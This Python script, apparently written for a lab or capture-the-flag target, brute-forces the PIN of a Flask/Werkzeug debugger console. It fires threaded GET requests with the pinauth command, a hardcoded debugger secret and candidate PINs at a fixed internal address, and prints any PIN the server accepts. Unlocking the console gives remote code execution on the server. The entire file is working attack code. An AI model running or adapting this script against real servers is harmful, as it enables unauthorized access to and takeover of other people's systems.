import threading
import queue
import requests as req


def check_auth(response):
    return '"auth": false' not in response


def fer_threaded(pin, queue):
    """Attempts PIN authentication and adds the PIN to the queue if found."""
    secret = 'IFBLDjzpiZAnv5Bj60Hx'
    url = f"http://172.31.69.87:5000/console"
    parm = f"__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}"
    res = req.get(url, params=parm)

    if check_auth(res.text):
        print('Found PIN: \033[92m', pin, '\033[0m')
        queue.put(pin)  # Add PIN to the queue


def main():
    # Controlled concurrency with a loop and delay
    threads = []
    found_pins_queue = queue.Queue()  # Create a queue to store found PINs

    # Choose one of the following approaches to define PINs:

    # Option 1: User input (replace with your implementation)
    # start_pin = int(input("Enter starting PIN (XXX-XXX-XXX): "))
    # end_pin = int(input("Enter ending PIN (XXX-XXX-XXX): "))

    # Option 2: File input (replace with your implementation)
    # with open("pins.txt", "r") as f:
    #   pins = f.readlines()

    # Option 3: Fixed list (replace with your desired PINs)
    pins = [
        
    ]

    for pin in pins:
        thread = threading.Thread(target=fer_threaded, args=(pin, found_pins_queue))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # Check if any PINs were found
    found_pins = []
    while not found_pins_queue.empty():
        found_pins.append(found_pins_queue.get())  # Get all PINs from the queue

    if found_pins:
        print('Found PIN(s):', found_pins)
    else:
        print('No PIN found in the given list')


if __name__ == '__main__':
    main()
